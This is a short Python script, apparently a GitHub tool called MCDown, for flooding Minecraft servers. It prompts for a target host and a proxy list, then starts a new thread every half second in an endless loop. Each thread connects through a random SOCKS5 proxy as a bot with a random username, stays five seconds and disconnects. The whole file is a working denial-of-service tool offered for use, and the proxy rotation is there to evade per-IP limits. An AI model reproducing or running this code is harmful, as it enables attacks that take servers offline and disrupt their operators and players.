"""
MCDown created by https://github.com/newpotsdev
Link: https://github.com/newpotsdev/mcdown
Version: 0.1 beta
Credits: ammaraskar (pyCraft) https://github.com/ammaraskar/pyCraft/"""
__author__ = "newpotsdev"

import random
import socket
import socks
import string
import time
import threading

from minecraft.networking.connection import Connection


def uname(length):
    source = ""
    for i in range(length):
        source += random.choice(list(string.ascii_lowercase + string.ascii_uppercase + '0123456789'))
    return source


def connectize(addr, proxy_addr):
    socks.set_default_proxy(socks.SOCKS5, proxy_addr.split(":")[0], int(proxy_addr.split(":")[1]))
    socket.socket = socks.socksocket
    connection = Connection(
        addr[0], int(addr[1]), username=uname(random.randint(6, 9)))
    connection.connect()
    time.sleep(5)
    connection.disconnect()


def main():
    host = input("Enter host (ip:port) >> ").split(":")
    with open(input("Proxies file >> "), 'r') as f:
        proxies = f.read().split('\n')
        print("Running...")
    while True:
        threading.Thread(target=connectize, args=(host, random.choice(proxies))).start()
        time.sleep(0.5)
        # connectize(host)


if __name__ == "__main__":
    main()
